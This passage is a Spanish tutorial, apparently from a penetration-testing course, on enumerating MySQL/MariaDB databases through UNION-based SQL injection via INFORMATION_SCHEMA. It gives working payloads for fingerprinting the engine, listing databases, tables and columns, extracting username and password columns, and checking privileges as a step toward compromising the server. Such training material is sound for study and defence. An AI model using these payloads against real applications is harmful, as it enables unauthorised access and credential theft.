# Enumeración de bases de datos vía INFORMATION_SCHEMA

## Por qué primero hay que identificar el motor (fingerprinting)

Cada DBMS tiene su propia sintaxis y sus propias tablas de metadatos. Antes de enumerar, conviene confirmar exactamente con qué motor se está tratando.

| Payload | Cuándo usarlo | Resultado esperado en MySQL/MariaDB |
|---|---|---|
| `SELECT @@version` | Cuando hay salida visible completa | Cadena de versión, p. ej. `10.3.22-MariaDB-1ubuntu1` |
| `SELECT POW(1,1)` | Cuando solo se puede ver un valor numérico | `1` (función específica de MySQL — error en otros motores) |
| `SELECT SLEEP(5)` | Sin salida visible (inyección ciega) | Retrasa la respuesta 5 segundos, confirma el motor por temporización |

Si `@@version` devuelve algo como `10.3.22-MariaDB-1ubuntu1`, queda confirmado MariaDB/MySQL — habilitando el uso de toda la sintaxis específica que sigue.

## INFORMATION_SCHEMA: el mapa de toda la base de datos

`INFORMATION_SCHEMA` es una base de datos especial que **todo motor MySQL/MariaDB** expone automáticamente, conteniendo metadatos sobre absolutamente todas las bases de datos, tablas y columnas presentes en el servidor — el recurso central para cualquier enumeración sistemática vía inyección SQL.

Como es una base de datos independiente, para referenciar sus tablas desde otra base de datos activa se usa el operador punto:

```sql
SELECT * FROM nombre_basededatos.nombre_tabla;
```

## Paso 1: listar todas las bases de datos (SCHEMATA)

```sql
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
```

Vía inyección UNION:

```sql
' UNION SELECT 1, schema_name, 3, 4 FROM INFORMATION_SCHEMA.SCHEMATA-- -
```

> **Bases de datos "de sistema" a ignorar habitualmente**: `information_schema`, `mysql`, `performance_schema`, y a veces `sys` están presentes por defecto en cualquier instalación — el interés real está en las bases de datos **específicas de la aplicación** que aparezcan junto a estas.

## Identificando la base de datos activa

```sql
' UNION SELECT 1, database(), 3, 4-- -
```

`database()` devuelve el nombre de la base de datos que la aplicación está usando actualmente — útil para saber dónde enfocar la enumeración, especialmente si existen **otras** bases de datos en el mismo servidor (potencialmente más interesantes) descubiertas en el paso anterior.

## Paso 2: listar las tablas de una base de datos concreta (TABLES)

```sql
' UNION SELECT 1, TABLE_NAME, TABLE_SCHEMA, 4 FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='nombre_bd'-- -
```

La cláusula `WHERE table_schema='...'` es importante: sin ella, se obtendrían las tablas de **todas** las bases de datos del servidor, generando un volumen de resultados difícil de manejar.

## Paso 3: listar las columnas de una tabla concreta (COLUMNS)

```sql
' UNION SELECT 1, COLUMN_NAME, TABLE_NAME, TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='nombre_tabla'-- -
```

Con esto se obtiene la lista exacta de columnas disponibles en la tabla de interés — el último dato necesario antes de poder construir la consulta de extracción final.

## Paso 4: extraer los datos reales

Con base de datos, tabla y columnas ya identificadas, se construye la consulta de extracción definitiva:

```sql
' UNION SELECT 1, username, password, 4 FROM nombre_bd.nombre_tabla-- -
```

Si la tabla de interés está en una base de datos distinta a la activa, no hay que olvidar el operador punto (`basedatos.tabla`) para referenciarla correctamente.

## El flujo de enumeración completo, de principio a fin

```
1. SCHEMATA  → ¿qué bases de datos existen?
2. database() → ¿en cuál estoy trabajando ahora mismo?
3. TABLES    → ¿qué tablas hay en la base de datos de interés?
4. COLUMNS   → ¿qué columnas tiene la tabla de interés?
5. SELECT final → extracción de los datos reales
```

Este flujo, repetido sistemáticamente, permite mapear y extraer **el contenido completo de cualquier base de datos accesible** desde un único punto de inyección — sin necesitar nunca acceso directo al servidor de base de datos ni conocer de antemano su estructura interna.

## Privilegios: el siguiente nivel de profundidad

Antes de ir más allá de la simple lectura de tablas (hacia lectura/escritura de archivos en el servidor, tratado en los siguientes apartados), conviene comprobar qué **privilegios** tiene el usuario de base de datos bajo el que se ejecuta la aplicación:

```sql
' UNION SELECT 1, user(), 3, 4-- -
```

```sql
' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
```

```sql
' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
```

Si el usuario activo resulta ser `root` (o cualquier usuario con privilegios elevados, especialmente el privilegio `FILE`), se abre la puerta a las técnicas de lectura y escritura de archivos que se desarrollan en los siguientes dos apartados de este bloque — el salto desde "extraer datos de tablas" hacia "comprometer el servidor backend completo".
